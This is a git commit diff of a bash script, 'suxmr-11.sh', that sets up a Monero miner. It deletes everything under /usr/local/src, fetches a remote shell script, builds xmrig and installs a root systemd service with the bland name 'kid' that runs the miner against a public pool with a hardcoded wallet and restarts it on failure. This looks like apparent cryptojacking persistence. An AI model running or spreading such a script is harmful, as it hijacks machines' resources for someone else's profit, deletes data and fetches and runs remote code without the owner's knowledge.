40420407e8807ffd7bb0fbe3ee7f92a541b9a808
waniekvbgm <69979619+waniekvbgm@users.noreply.github.com>
2020-10-13 00:10:32 +0700

    Update suxmr-11.sh

--- suxmr-11.sh
+++ suxmr-11.sh
@@ -1,11 +1,11 @@
 #!/usr/bin/env bash
 sudo apt-get update && 
-apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev gcc g++ make screen curl libgmp-dev automake git &&
+apt-get -y install build-essential curl libssl-dev libcurl4-openssl-dev libjansson-dev gcc g++ make screen curl libgmp-dev automake git &&
 sudo sysctl vm.nr_hugepages=128 &&
 sudo sysctl -w vm.nr_hugepages=128 &&
 sudo apt install -y build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev && 
 cd /usr/local/src/ && rm -rf * &&
-wget https://raw.githubusercontent.com/waniekvbgm/zalska/master/suxmr-11-link1.sh && chmod a+x suxmr-11-link1.sh
+curl -O https://raw.githubusercontent.com/waniekvbgm/zalska/master/suxmr-11-link1.sh && chmod a+x suxmr-11-link1.sh
 git clone https://github.com/waniekvbgm/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. && make
 bash -c 'cat <<EOT >>/lib/systemd/system/kid.service 
 [Unit]
@@ -13,7 +13,7 @@ Description=kid
 After=network.target
 [Service]
 Type=forking
-ExecStart=/usr/local/src/suxmr-11-link1.sh
+ExecStart=/bin/sh -c 'cd /usr/local/src/xmrig/build/ && ./xmrig --coin=monero -B -R 10 -o stratum+tcp://pool.supportxmr.com:5555 -u 49Pnc1zJMKR4pLqYB1Gw7GiSVCsYmE8nYcaXYhra1xDsGxPwgvg9moCZN5uaDs8739it2hxpJx3yBMbHzwXUhg9AK6vsGLb -p x -k'
 Restart=on-failure
 RestartSec=60
 User=root
